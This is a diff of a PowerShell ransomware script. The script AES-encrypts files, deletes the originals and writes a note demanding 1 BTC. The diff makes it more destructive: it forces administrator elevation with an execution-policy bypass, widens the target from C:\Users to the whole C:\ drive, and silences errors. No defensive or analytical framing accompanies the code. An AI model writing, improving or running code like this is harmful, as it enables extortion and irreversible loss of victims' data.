@@ -1,9 +1,17 @@
-$key = [Convert]::ToBase64String((1..32 | ForEach-Object {Get-Random -Maximum 256}))
-$files = Get-ChildItem -Path "C:\Users" -Recurse -File
-foreach ($file in $files) {
-    $content = Get-Content -Path $file.FullName -Raw
-    $encrypted = [Convert]::ToBase64String((New-Object Security.Cryptography.AesManaged).CreateEncryptor([Convert]::FromBase64String($key), (New-Object byte[] 16)).TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($content), 0, $content.Length))
-    Set-Content -Path ($file.FullName + ".locked") -Value $encrypted
-    Remove-Item -Path $file.FullName
+# Force run as admin
+if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
 }
-Set-Content -Path "C:\RansomNote.txt" -Value "Your files are locked! Send 1 BTC to 1FakeBitcoinAddress to get the key: $key"
+
+$key = [Convert]::ToBase64String((1..32 | ForEach-Object {Get-Random -Maximum 256}))
+$files = Get-ChildItem -Path "C:\" -Recurse -File -ErrorAction SilentlyContinue
+foreach ($file in $files) {
+    $content = Get-Content -Path $file.FullName -Raw -ErrorAction SilentlyContinue
+    if ($content) {
+        $encrypted = [Convert]::ToBase64String((New-Object Security.Cryptography.AesManaged).CreateEncryptor([Convert]::FromBase64String($key), (New-Object byte[] 16)).TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($content), 0, $content.Length))
+        Set-Content -Path ($file.FullName + ".locked") -Value $encrypted
+        Remove-Item -Path $file.FullName -ErrorAction SilentlyContinue
+    }
+}
+Set-Content -Path "C:\RansomNote.txt" -Value "System’s toast! Send 1 BTC to 1FakeBitcoinAddress for key: $key"
